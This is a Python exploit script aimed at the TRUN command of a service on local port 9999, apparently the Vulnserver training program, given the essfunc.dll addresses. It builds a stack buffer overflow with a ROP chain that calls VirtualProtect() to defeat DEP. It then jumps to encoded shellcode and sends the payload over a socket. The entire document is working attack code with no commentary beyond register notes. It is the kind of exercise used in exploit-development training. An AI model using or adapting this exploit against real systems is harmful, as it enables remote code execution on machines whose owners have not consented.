import socket, struct

#----------------------------------------#
# ROP Chain setup for VirtualProtect()   #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = lpOldProtect (ptr to W address)  #
# EDX = NewProtect (0x40)                #
# EBX = dwSize                           #
# ESP = lPAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        #
# ESI = ptr to VirtualProtect()          #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

def p32(x):
    return struct.pack("I", x)

shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

rop =  p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0x6250609c) # ptr to &VirtualProtect() 
rop += p32(0x77e82d04) # MOV EAX,DWORD PTR DS:[EAX] # RETN (kernel32.virtualprotect)
rop += p32(0x77eb7401) # PUSH EAX    # POP ESI # POP EBP # RETN 0x04 [RPCRT4.dll] 
rop += p32(0x41414141) # compensate -----'           |
rop += p32(0x77c4832b) # POP EBP # RETN [msvcrt.dll]-'-----.
rop += p32(0x41414141) # Filler (RETN offset compensation)-|
rop += p32(0x625011af) # & jmp esp [essfunc.dll]-----------'
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0xffffffc0) # NEG to 0x40
rop += p32(0x7e44493b) # NEG EAX # RETN
rop += p32(0x7e461bc2) # XCHG EAX,EDX # RETN 0x00   
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0xfffffdff) # NEG to 0x201
rop += p32(0x7e44493b) # NEG EAX # RETN
rop += p32(0x77df563a) # XCHG EAX,EBX # RETN 
rop += p32(0x77c1f815) # POP ECX # RETN
rop += p32(0x71a951ec) # writable address
rop += p32(0x77ecd443) # POP EDI # RETN
rop += p32(0x662b9d79) # RETN  
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0x90909090) # NOP
rop += p32(0x77e9edf1) # PUSHAD # RETN

p =  "TRUN ./"
p += "A" * 2005
p += rop
p += "\x90" * 20
p += shellcode
p += "\x90" * (2500-2005-len(rop)-20)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.send(p)
